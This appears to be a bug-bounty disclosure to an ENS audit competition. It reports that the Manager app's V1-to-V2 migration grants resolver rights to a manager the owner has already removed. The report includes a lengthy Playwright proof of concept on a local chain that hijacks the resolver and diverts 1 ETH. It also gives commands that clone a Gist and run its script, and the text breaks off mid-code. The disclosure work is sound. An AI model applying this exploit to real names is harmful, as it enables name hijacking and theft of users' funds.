# 90626 w a medium manager migration restores a removed v1 manager enabling resolver hijack and fund theft

## #90626 \[W\&A-Medium] Manager migration restores a removed V1 manager, enabling resolver hijack and fund theft

**Submitted on Aug 26th 2026 at 03:06:03 UTC by @coinsspor for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90626
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves
  * Direct theft of user funds

### Description

## Manager restores a removed V1 manager during migration, enabling resolver hijack and fund theft

### Brief/Intro

ENS Manager caches a truthful V1 manager discovery result for five minutes but does not rebind that security principal to the live V1 Registry before migration execution. A victim can remove a historical manager with `reclaim()` on the same open Manager page, yet Upgrade still grants that removed address fresh V2 `ROLE_SET_RESOLVER`. The former manager can replace the migrated name's resolver, redirect the same ENS name to an attacker payout address, and receive funds sent through normal ENS resolution. The production-build end-to-end PoC demonstrates an exact 1 ETH loss without ever serving stale indexer data after reclaim.

### Vulnerability Details

#### Affected asset and revision

* Asset: `apps/manager`
* Audited policy revision: `63772fd872af472ced58b009499355f3430c2a86`
* Public competition import used by the PoC: `cda79acaad59711b943fc68207ebb3f1d0ff8596`

The PoC runs against the public competition import of audited policy revision `63772fd872af472ced58b009499355f3430c2a86`; the affected Manager code is unchanged in that import.

#### Root cause

Manager obtains V1 names from the subgraph and treats the indexed Registry owner as an authorization principal:

```ts
// apps/manager/src/features/migration/hooks/useV1Names.ts
queryFn:
  enabled && address ? () => getV1NamesForAddress(address) : skipToken,
staleTime: 5 * 60 * 1000,
```

For an unwrapped registration, classification converts `domain.owner.id` into `managerAddress` whenever it differs from the registrant:

```ts
// packages/migration/src/service/classifyNames.ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

Manager later builds a persistent V2 resolver-role grant to that captured address:

```ts
// apps/manager/src/features/migration/service/buildRoleGrantCalls.ts
return {
  to: V2_CONTRACTS.ETHRegistry,
  data: encodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    functionName: 'grantRoles',
    args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
  }),
  value: 0n,
}
```

`buildAtomicMigrationBatches()` inserts this call into the HCA batch and even verifies the resulting stale-address role as intended post-state. The execution path refreshes token approvals, HCA state, destination routes and receipts, but never calls the live V1 Registry `owner(namehash(name))` to verify `managerAddress` before the grant.

The security invariant is:

> A principal restored during migration must still be the authoritative V1 manager at execution time.

#### Attack sequence

{% stepper %}
{% step %}

### Historical V1 manager state

The attacker previously served as the V1 registry manager for an unwrapped victim registration.
{% endstep %}

{% step %}

### Truthful Manager discovery

While that state is still authoritative, the real Manager page makes exactly one `getNamesForAddress` request; the response truthfully contains the attacker.
{% endstep %}

{% step %}

### Victim removes the manager

Without closing or reloading the page, the victim authoritatively removes that manager with `BaseRegistrar.reclaim(tokenId, victim)`.
{% endstep %}

{% step %}

### Attacker loses active authority

`ENSRegistry.owner(namehash(name))` is now the victim, and the attacker has no active V1 or V2 role. The exact later attacker `setResolver` action reverts.
{% endstep %}

{% step %}

### Cache remains fresh

A hypothetical later discovery response is configured from live Registry state, but Manager performs no request before Upgrade because the first result remains five-minute fresh.
{% endstep %}

{% step %}

### Victim migrates normally

The victim confirms the normal Manager V1-to-V2 migration.
{% endstep %}

{% step %}

### Removed manager receives a V2 role

Manager builds and executes `grantRoles(resource, 1 << 24, formerManager)` from the cached historical value.
{% endstep %}

{% step %}

### Resolver takeover succeeds

The exact attacker `setResolver` action that reverted before migration now succeeds.
{% endstep %}

{% step %}

### ENS resolution is redirected

The same FQDN that resolved to the victim now resolves to a separate attacker payout address through the official Universal Resolver.
{% endstep %}

{% step %}

### Funds are sent to the attacker-controlled resolution result

A separate innocent payer sends 1 ETH to that normal resolution result.
{% endstep %}
{% endstepper %}

At migration execution time, the attacker is nonprivileged: the victim has already reclaimed the V1 manager position, and the attacker holds no V2 role. The PoC asserts `attackerHadRoleBeforeMigration: false`, captures the Manager-produced grant transaction and event (`oldRoleBitmap=0`, `newRoleBitmap=16777216`), and proves the unrelated negative-control account cannot change the resolver.

#### Why the root cause is in scope

The hardened PoC does not require indexer lag or a wrong response: the first and every later served response exactly match live `ENSRegistry.owner()` at response time. The in-scope Manager application retains the initially correct authorization value after chain state changes and converts it into fresh persistent authority without a live execution-time rebind. A Manager-only validation change eliminates the vulnerability.

#### Why this is not previous privilege

The attacker has already lost the V1 Registry manager position before migration and has no V2 role. Manager creates the new V2 permission. This is materially different from a current owner or manager exercising authority they still possess.

#### Independence from ENS-001 and public contract issues

ENS-001/89253 concerns account-only aggregation and incomplete multi-resource revocation in Portal. ENS-003 uses no aggregation or revoke flow. Contracts-v2 #418 concerns delegated roles surviving a V2 ownership transfer; ENS-003 performs no V2 transfer and instead creates a new role from stale app data. Neither fix affects this bug.

### Impact Details

The exact competition Critical impact applies:

> Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker.

The PoC also directly demonstrates the listed Critical impacts `Direct theft of user funds` and resolving an ENS name to an attacker-controlled unintended recipient.

For the same FQDN:

* before exploitation, the official Universal Resolver returns the victim address;
* after the former manager changes the resolver, it returns the attacker payout address;
* the payment transaction uses the returned value as `to`, not a hard-coded payout;
* the payout balance increases by exactly `1,000,000,000,000,000,000` wei.

The victim can later revoke the role and restore future resolution with two transactions. The PoC executes this recovery and does not claim permanent takeover. The completed 1 ETH payment remains at the payout address and is not recovered.

### References

* Secret Gist environment: `https://gist.github.com/coinsspor/c21fb1e5bc8977bf5c18e4e8fb2e323f`
* Frozen source: `apps/manager/src/features/migration/hooks/useV1Names.ts`
* Frozen source: `packages/migration/src/service/classifyNames.ts`
* Frozen source: `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`
* Frozen source: `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts`
* Full one-command source and successful output: `IMMUNEFI-POC-SUBMISSION.md` in the secret Gist
* Raw app transaction: `evidence/generated-transaction.json`
* Role event: `evidence/role-grant-event.json`
* Before/after/recovery state: `evidence/before-state.json`, `evidence/after-state.json`, `evidence/recovery-state.json`
* Receipts: `evidence/receipts.json`
* Cache truthfulness/request log: `evidence/cache-toctou.json`
* Two successful production-build runs: `evidence/poc-run-1.log`, `evidence/poc-run-2.log`

### Link to Proof of Concept

<https://gist.github.com/coinsspor/c21fb1e5bc8977bf5c18e4e8fb2e323f>

### Proof of Concept

## Proof of Concept

This is an end-to-end Playwright and isolated-local-chain PoC against the frozen public competition import `cda79acaad59711b943fc68207ebb3f1d0ff8596` of audited policy revision `63772fd872af472ced58b009499355f3430c2a86`.

### Secret Gist environment

Complete runnable source, both raw successful logs, all textual transaction/state evidence, remediation notes and the portable bootstrap are available in this secret Gist:

**<https://gist.github.com/coinsspor/c21fb1e5bc8977bf5c18e4e8fb2e323f>**

The Gist is unlisted (`public: false`). A clean reviewer can reproduce from it with:

```bash
git clone https://gist.github.com/c21fb1e5bc8977bf5c18e4e8fb2e323f.git ENS-003-gist
cd ENS-003-gist
bash gist-run-poc.sh
```

The complete runnable source, both full raw successful logs, and all critical textual evidence are available in the secret Gist; the runnable source, execution steps, and critical results are also included directly in this report.

It proves the complete sequence:

{% stepper %}
{% step %}

### Authentic registration and premigration state

Authentic V1 registration and V2 reserved premigration state.
{% endstep %}

{% step %}

### Truthful discovery response

While the attacker is the live V1 manager, production-build Manager receives exactly one truthful discovery response.
{% endstep %}

{% step %}

### Manager is reclaimed away

On the same open page, the victim removes that manager with real V1 `reclaim`.
{% endstep %}

{% step %}

### No stale response is provided

Manager makes no discovery request before Upgrade and receives no stale post-reclaim response.
{% endstep %}

{% step %}

### Attacker lacks authority before migration

The exact attacker action reverts and the attacker has no V2 resolver role before migration.
{% endstep %}

{% step %}

### Manager grants the removed manager authority

The app-produced migration transaction grants the removed address `ROLE_SET_RESOLVER`.
{% endstep %}

{% step %}

### Attacker changes the resolver

The same attacker action succeeds and changes the resolver.
{% endstep %}

{% step %}

### ENS resolution changes

The same FQDN changes from victim to a separate attacker payout through the official Universal Resolver.
{% endstep %}

{% step %}

### Payer sends 1 ETH

An independent payer sends 1 ETH to the actual returned resolution value, increasing payout by exactly `1e18` wei.
{% endstep %}

{% step %}

### Recovery prevents future abuse

Recovery stops future abuse but does not recover the payment.
{% endstep %}
{% endstepper %}

### Prerequisites

* Node 22, pnpm 10, Foundry and Playwright browsers;
* Docker with Compose when the official local E2E stack is not already running.

The runner verifies the frozen SHA, starts the repository's official local E2E environment when RPC is absent, installs the frozen dependencies when needed, validates/downloads pinned Chromium, builds Manager in production CI mode, and starts its preview server.

For a clean reviewer environment, clone the secret Gist and run its bootstrap:

```bash
git clone https://gist.github.com/c21fb1e5bc8977bf5c18e4e8fb2e323f.git ENS-003-gist
cd ENS-003-gist
bash gist-run-poc.sh
```

### File: evidence/experiments/T3-059/poc.playwright.spec.ts

```typescript
import { Web3RequestKind } from '@ensdomains/headless-web3-provider'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import {
  type Abi,
  type Address,
  bytesToHex,
  decodeFunctionResult,
  encodeFunctionData,
  keccak256,
  namehash,
  parseAbi,
  parseAbiItem,
  parseEther,
  toHex,
  zeroAddress,
} from 'viem'
import { packetToBytes } from 'viem/ens'
import { mnemonicToAccount, privateKeyToAccount } from 'viem/accounts'

import {
  expect,
  test,
} from '../../../frozen-src/e2e/fixtures/playwright.manager.fixture.js'
import {
  publicClient,
  testClient,
  walletClient,
} from '../../../frozen-src/e2e/helpers/anvil-client.js'
import {
  connectWithHeadlessWallet,
  dismissBackendAuthModal,
} from '../../../frozen-src/e2e/helpers/manager-auth.js'

const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
const V1_BASE_REGISTRAR =
  '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85' as Address
const V1_ENS_REGISTRY =
  '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e' as Address
const V1_BASE_REGISTRAR_OWNER =
  '0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa' as Address
const V1_PUBLIC_RESOLVER =
  '0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f' as Address
const V2_ETH_REGISTRY =
  '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address
const V2_ETH_REGISTRAR =
  '0xa88553F454b77203B0D036A05c894d555EAAa2Cc' as Address
const UNIVERSAL_RESOLVER =
  '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe' as Address
const ROLE_SET_RESOLVER = 1n << 24n
const ONE_YEAR = 365n * 24n * 60n * 60n
const DEFAULT_ANVIL_MNEMONIC =
  'test test test test test test test test test test test junk'

const baseRegistrarAbi = parseAbi([
  'function addController(address controller)',
  'function removeController(address controller)',
  'function register(uint256 id, address owner, uint256 duration) returns (uint256)',
  'function reclaim(uint256 id, address owner)',
  'function nameExpires(uint256 id) view returns (uint256)',
])
const v1RegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
])
const v2RegistryAbi = parseAbi([
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
  'function hasRoles(uint256 anyId, uint256 roleBitmap, address account) view returns (bool)',
  'function revokeRoles(uint256 resource, uint256 roleBitmap, address account) returns (bool)',
  'function getResolver(string label) view returns (address)',
  'function setResolver(uint256 anyId, address resolver)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node, uint256 coinType, bytes value)',
  'function addr(bytes32 node) view returns (address)',
])
const universalResolverAbi = parseAbi([
  'function resolve(bytes name, bytes data) view returns (bytes result, address resolver)',
])
const rolesChangedEvent = parseAbiItem(
  'event EACRolesChanged(uint256 indexed resource, address indexed account, uint256 oldRoleBitmap, uint256 newRoleBitmap)',
)

const installMigrationFeatureFlag = async (
  page: Parameters<typeof connectWithHeadlessWallet>[0],
) => {
  await page.addInitScript(() => {
    type PostHogWindow = Window & {
      managerFeatureFlagsOverridden?: boolean
      posthog?: {
        __loaded?: boolean
        featureFlags?: {
          overrideFeatureFlags(options: {
            flags: Record<string, boolean>
          }): void
        }
      }
    }
    const apply = () => {
      const current = window as PostHogWindow
      if (!current.posthog?.__loaded || !current.posthog.featureFlags) {
        return false
      }
      current.posthog.featureFlags.overrideFeatureFlags({
        flags: { migration: true },
      })
      current.managerFeatureFlagsOverridden = true
      return true
    }
    if (apply()) return
    const interval = window.setInterval(() => {
      if (apply()) window.clearInterval(interval)
    }, 10)
  })
}

const resolveEthAddress = async (ensName: string): Promise<{
  address: Address
  resolver: Address
}> => {
  const node = namehash(ensName)
  const call = encodeFunctionData({
    abi: resolverAbi,
    functionName: 'addr',
    args: [node],
  })
  const [result, resolver] = await publicClient.readContract({
    address: UNIVERSAL_RESOLVER,
    abi: universalResolverAbi,
    functionName: 'resolve',
    args: [bytesToHex(packetToBytes(ensName)), call],
  })
  return {
    address: decodeFunctionResult({
      abi: resolverAbi,
      functionName: 'addr',
      data: result,
    }),
    resolver,
  }
}

const getEthBalanceUncached = async (
  address: Address,
  blockTag: 'latest' | `0x${string}` = 'latest',
): Promise<bigint> =>
  BigInt(
    await publicClient.request({
      method: 'eth_getBalance',
      params: [address, blockTag],
    }),
  )

async function makeFrozenV1MigrationFixture(
  victim: ReturnType<typeof privateKeyToAccount>,
): Promise<string> {
  const label = `stale-manager-${Date.now()}`
  const tokenId = BigInt(keccak256(toHex(label)))

  // Deterministic local setup only: temporarily make the victim a registrar
  // controller, mint an authentic V1 ERC-721, then remove that setup power.
  // The candidate path itself never relies on impersonation or storage writes.
  await testClient.setBalance({
    address: V1_BASE_REGISTRAR_OWNER,
    value: 10n ** 18n,
  })
  await testClient.impersonateAccount({ address: V1_BASE_REGISTRAR_OWNER })
  try {
    const addHash = await walletClient.sendTransaction({
      account: V1_BASE_REGISTRAR_OWNER,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'addController',
        args: [victim.address],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: addHash })

    const registerHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'register',
        args: [tokenId, victim.address, ONE_YEAR],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: registerHash })

    const removeHash = await walletClient.sendTransaction({
      account: V1_BASE_REGISTRAR_OWNER,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'removeController',
        args: [victim.address],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: removeHash })
  } finally {
    await testClient.stopImpersonatingAccount({
      address: V1_BASE_REGISTRAR_OWNER,
    })
  }

  // V1 registration normally establishes the registry manager via reclaim.
  const reclaimHash = await walletClient.sendTransaction({
    account: victim,
    to: V1_BASE_REGISTRAR,
    data: encodeFunctionData({
      abi: baseRegistrarAbi,
      functionName: 'reclaim',
      args: [tokenId, victim.address],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: reclaimHash })

  const expiry = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'nameExpires',
    args: [tokenId],
  })

  // Mirror the production premigration snapshot: a V1 name has a RESERVED V2
  // slot. The real V2 registrar is impersonated only to create that fixture.
  await testClient.setBalance({ address: V2_ETH_REGISTRAR, value: 10n ** 18n })
  await testClient.impersonateAccount({ address: V2_ETH_REGISTRAR })
  try {
    const reserveHash = await walletClient.sendTransaction({
      account: V2_ETH_REGISTRAR,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'register',
        args: [
          label,
          zeroAddress,
          zeroAddress,
          V1_PUBLIC_RESOLVER,
          0n,
          expiry,
        ],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: reserveHash })
  } finally {
    await testClient.stopImpersonatingAccount({ address: V2_ETH_REGISTRAR })
  }

  return `${label}.eth`
}

test.describe('T3-059 stale V1 manager resurrection', () => {
  test.describe.configure({ timeout: 300_000 })

  test('real Manager migration grants V2 resolver authority to a manager already reclaimed away on V1', async ({
    page,
    wallet,
    accounts,
  }) => {
    const victim = privateKeyToAccount(accounts.getPrivateKey('user'))
    // `user2` is the V2 deployment owner in this local stack. It must never be
    // used as the attacker because its root authority would invalidate causal
    // proof. user3/user4 start with no registry privilege.
    const attacker = privateKeyToAccount(accounts.getPrivateKey('user3'))
    const negativeControl = privateKeyToAccount(accounts.getPrivateKey('user4'))
    const payout = mnemonicToAccount(DEFAULT_ANVIL_MNEMONIC, {
      addressIndex: 4,
    })
    const payer = mnemonicToAccount(DEFAULT_ANVIL_MNEMONIC, {
      addressIndex: 5,
    })
    // These well-known test addresses carry unrelated EIP-7702 delegation
    // code in the pinned Sepolia fork. Mirror the official wallet fixture's
    // EOA normalization so payout accounting measures a plain receiving EOA.
    await testClient.setCode({ address: payout.address, bytecode: '0x' })
    await testClient.setCode({ address: payer.address, bytecode: '0x' })
    const ensName = await makeFrozenV1MigrationFixture(victim)
    const label = ensName.slice(0, -4)
    const node = namehash(ensName)
    const tokenId = BigInt(keccak256(toHex(label)))
    const resource = labelToCanonicalId(label)
    const expiry = await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'nameExpires',
      args: [tokenId],
    })

    // Establish a real legacy manager epoch on V1.
    const grantManagerHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'reclaim',
        args: [tokenId, attacker.address],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: grantManagerHash })
    expect(
      (
        await publicClient.readContract({
          address: V1_ENS_REGISTRY,
          abi: v1RegistryAbi,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    const domainForManager = (manager: Address) => ({
      id: node,
      labelName: label,
      labelhash: keccak256(toHex(label)),
      name: ensName,
      resolver: null,
      owner: { id: manager.toLowerCase() },
      registrant: { id: victim.address.toLowerCase() },
      wrappedOwner: null,
      parent: { name: 'eth', wrappedDomain: null },
      registration: { expiryDate: expiry.toString() },
      wrappedDomain: null,
    })

    // Every response is truthful at response time. If Manager asks again after
    // reclaim, this handler returns the fresh live manager. The exploit is
    // caused solely by Manager retaining the first truthful response for five
    // minutes and not rebinding authority before transaction construction.
    let namesRequestCount = 0
    let reclaimCompleted = false
    const namesResponseLog: Array<{
      request: number
      liveManager: Address
      returnedManager: Address
      afterReclaim: boolean
    }> = []

    const localServiceRoutes = [
      ['**/rpc', 'http://127.0.0.1:8545'],
      ['**/orchestrator', 'http://127.0.0.1:3007'],
      ['**/bundler', 'http://127.0.0.1:4337'],
      ['**/paymaster', 'http://127.0.0.1:3002'],
    ] as const
    for (const [pattern, target] of localServiceRoutes) {
      await page.route(pattern, async (route) => {
        const response = await route.fetch({ url: target })
        await route.fulfill({ response })
      })
    }
    await page.route('**/v1-graphql.ens.dev/subgraph', async (route, request) => {
      const body = request.postData() ?? ''
      if (body.includes('getNamesForAddress')) {
        namesRequestCount += 1
        const liveManager = await publicClient.readContract({
          address: V1_ENS_REGISTRY,
          abi: v1RegistryAbi,
          functionName: 'owner',
          args: [node],
        })
        namesResponseLog.push({
          request: namesRequestCount,
          liveManager,
          returnedManager: liveManager,
          afterReclaim: reclaimCompleted,
        })
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            data: { domains: [domainForManager(liveManager)] },
          }),
        })
        return
      }
      if (body.includes('getProfilesForDomains')) {
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({ data: { domains: [] } }),
        })
        return
      }
      await route.continue()
    })

    await installMigrationFeatureFlag(page)
    await page.goto(`${MANAGER_APP_URL}/migration`)
    await Promise.race([
      page.waitForLoadState('networkidle'),
      page.waitForTimeout(5_000),
    ]).catch(() => {})
    await connectWithHeadlessWallet(page, wallet)
    await dismissBackendAuthModal(page, { timeout: 20_000 })
    await page.waitForFunction(
      () =>
        (
          window as Window & {
            managerFeatureFlagsOverridden?: boolean
          }
        ).managerFeatureFlagsOverridden === true,
      undefined,
      { timeout: 10_000 },
    )
    await page.goto(`${MANAGER_APP_URL}/migration`)
    await page.waitForLoadState('networkidle')
    await page
      .getByText('Your names are ready to upgrade')
      .waitFor({ state: 'visible', timeout: 20_000 })
    const upgradeButton = page.getByRole('button', {
      name: /Upgrade 1 name/i,
    })
    await upgradeButton.waitFor({ state: 'visible', timeout: 60_000 })
    await expect(upgradeButton).toBeEnabled({ timeout: 60_000 })
    expect(namesRequestCount).toBe(1)
    expect(namesResponseLog).toHaveLength(1)
    expect(namesResponseLog[0]?.returnedManager.toLowerCase()).toBe(
      attacker.address.toLowerCase(),
    )
    const liveManagerAtFirstResponse = namesResponseLog[0]!.liveManager
    expect(liveManagerAtFirstResponse.toLowerCase()).toBe(
      attacker.address.toLowerCase(),
    )

    const reclaimHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'reclaim',
        args: [tokenId, victim.address],
      }),
    })
    const reclaimReceipt = await publicClient.waitForTransactionReceipt({
      hash: reclaimHash,
    })
    const liveManagerAfterReclaim = await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    })
    expect(reclaimReceipt.status).toBe('success')
    expect(liveManagerAfterReclaim.toLowerCase()).toBe(
      victim.address.toLowerCase(),
    )
    reclaimCompleted = true
    await page.waitForTimeout(1_000)
    expect(namesRequestCount).toBe(1)

    const attackerHadRoleBeforeMigration = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, attacker.address],
    })
    expect(attackerHadRoleBeforeMigration).toBe(false)

    const artifact = JSON.parse(
      await readFile(
        new URL(
          './out/AttackerResolver.sol/AttackerResolver.json',
          import.meta.url,
        ),
        'utf8',
      ),
    ) as {
      abi: Abi
      bytecode: { object: `0x${string}` }
    }
    const deployHash = await walletClient.deployContract({
      account: attacker,
      abi: artifact.abi,
      bytecode: artifact.bytecode.object,
      args: [payout.address],
    })
    const deployReceipt = await publicClient.waitForTransactionReceipt({
      hash: deployHash,
    })
    if (!deployReceipt.contractAddress) {
      throw new Error('AttackerResolver deployment did not return an address')
    }
    const attackerResolver = deployReceipt.contractAddress

    let attackerActionRevertedBeforeMigration = false
    try {
      await publicClient.simulateContract({
        account: attacker,
        address: V2_ETH_REGISTRY,
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [resource, attackerResolver],
      })
    } catch {
      attackerActionRevertedBeforeMigration = true
    }
    expect(attackerActionRevertedBeforeMigration).toBe(true)

    const namesRequestCountBeforeUpgrade = namesRequestCount
    expect(namesRequestCountBeforeUpgrade).toBe(1)
    const blockBeforeMigration = await publicClient.getBlockNumber({ cacheTime: 0 })
    await upgradeButton.click()

    const success = page.getByText('Your name has been upgraded!')
    const deadline = Date.now() + 180_000
    while (!(await success.isVisible().catch(() => false))) {
      if (Date.now() > deadline) {
        throw new Error('Migration did not reach success within 180 seconds')
      }
      if (
        wallet.getPendingRequestCount(Web3RequestKind.SendTransaction) > 0
      ) {
        await wallet.authorize(Web3RequestKind.SendTransaction)
      } else {
        await page.waitForTimeout(200)
      }
    }
    // Migration moves the legacy registry manager to the victim's HCA. The
    // removed V1 manager must not be confused with that expected HCA state.
    const v1OwnerAfterMigration = await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    })
    expect(v1OwnerAfterMigration.toLowerCase()).not.toBe(
      attacker.address.toLowerCase(),
    )

    // The success modal can render just before the final receipt is visible on
    // RPC. Bind evidence capture to authoritative role state, not UI timing.
    let attackerHasRole = false
    const roleDeadline = Date.now() + 30_000
    while (!attackerHasRole && Date.now() < roleDeadline) {
      attackerHasRole = await publicClient.readContract({
        address: V2_ETH_REGISTRY,
        abi: v2RegistryAbi,
        functionName: 'hasRoles',
        args: [resource, ROLE_SET_RESOLVER, attacker.address],
      })
      if (!attackerHasRole) await page.waitForTimeout(100)
    }
    expect(attackerHasRole).toBe(true)
    expect(
      namesResponseLog.every(
        ({ liveManager, returnedManager }) =>
          liveManager.toLowerCase() === returnedManager.toLowerCase(),
      ),
    ).toBe(true)
    const blockAfterMigration = await publicClient.getBlockNumber({ cacheTime: 0 })

    const roleLogs = await publicClient.getLogs({
      address: V2_ETH_REGISTRY,
      event: rolesChangedEvent,
      // EAC emits its versioned resource, while `grantRoles()` accepts the
      // canonical anyId. Filter by the exact account and assert the role bit.
      args: { account: attacker.address },
      fromBlock: blockBeforeMigration,
      toBlock: blockAfterMigration,
    })
    const roleGrantLog = roleLogs.find(
      (log) => (log.args.newRoleBitmap ?? 0n) & ROLE_SET_RESOLVER,
    )
    if (!roleGrantLog?.transactionHash) {
      throw new Error('No app-produced manager role-grant event was found')
    }
    const appRoleGrantTransaction = await publicClient.getTransaction({
      hash: roleGrantLog.transactionHash,
    })
    const appRoleGrantReceipt = await publicClient.getTransactionReceipt({
      hash: roleGrantLog.transactionHash,
    })
    const controlHasRole = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, negativeControl.address],
    })
    expect(controlHasRole).toBe(false)

    // Give the migrated resolver a legitimate victim address record, then
    // resolve the exact name through the official Universal Resolver.
    const resolverBefore = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'getResolver',
      args: [label],
    })
    const victimRecordHash = await walletClient.sendTransaction({
      account: victim,
      to: resolverBefore,
      data: encodeFunctionData({
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, 60n, victim.address],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: victimRecordHash })
    const resolutionBefore = await resolveEthAddress(ensName)
    expect(resolutionBefore.address.toLowerCase()).toBe(
      victim.address.toLowerCase(),
    )

    // Negative control: an unrelated address without the stale manager role
    // cannot change the registry resolver.
    await expect(
      publicClient.simulateContract({
        account: negativeControl,
        address: V2_ETH_REGISTRY,
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [resource, negativeControl.address],
      }),
    ).rejects.toThrow()

    // Exercise the newly restored authority through the actual V2 registry.
    const hijackHash = await walletClient.sendTransaction({
      account: attacker,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [resource, attackerResolver],
      }),
    })
    const hijackReceipt = await publicClient.waitForTransactionReceipt({
      hash: hijackHash,
    })
    const resolverAfter = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'getResolver',
      args: [label],
    })
    expect(hijackReceipt.status).toBe('success')
    expect(resolverBefore.toLowerCase()).not.toBe(
      attackerResolver.toLowerCase(),
    )
    expect(resolverAfter.toLowerCase()).toBe(attackerResolver.toLowerCase())

    const resolutionAfter = await resolveEthAddress(ensName)
    expect(resolutionAfter.address.toLowerCase()).toBe(
      payout.address.toLowerCase(),
    )

    // The payment destination is the actual value returned by Universal
    // Resolver. The hard-coded payout address is not used as `to`.
    const paymentHash = await walletClient.sendTransaction({
      account: payer,
      to: resolutionAfter.address,
      value: parseEther('1'),
    })
    const paymentReceipt = await publicClient.waitForTransactionReceipt({
      hash: paymentHash,
    })
    const paymentTransaction = await publicClient.getTransaction({
      hash: paymentHash,
    })
    const payoutBalanceBefore = await getEthBalanceUncached(
      payout.address,
      toHex(paymentReceipt.blockNumber - 1n),
    )
    const payoutBalanceAfter = await getEthBalanceUncached(
      payout.address,
      toHex(paymentReceipt.blockNumber),
    )
    expect(paymentReceipt.status).toBe('success')
    expect(paymentTransaction.from.toLowerCase()).toBe(
      payer.address.toLowerCase(),
    )
    expect(paymentTransaction.to?.toLowerCase()).toBe(
      resolutionAfter.address.toLowerCase(),
    )
    expect(paymentTransaction.value).toBe(parseEther('1'))
    expect(payoutBalanceAfter - payoutBalanceBefore).toBe(parseEther('1'))

    // Recovery control: the victim can stop future abuse with two explicit
    // transactions, but the already transferred ETH is not recovered.
    const revokeHash = await walletClient.sendTransaction({
      account: victim,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'revokeRoles',
        args: [resource, ROLE_SET_RESOLVER, attacker.address],
      }),
    })
    const revokeReceipt = await publicClient.waitForTransactionReceipt({
      hash: revokeHash,
    })
    const restoreHash = await walletClient.sendTransaction({
      account: victim,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [resource, resolverBefore],
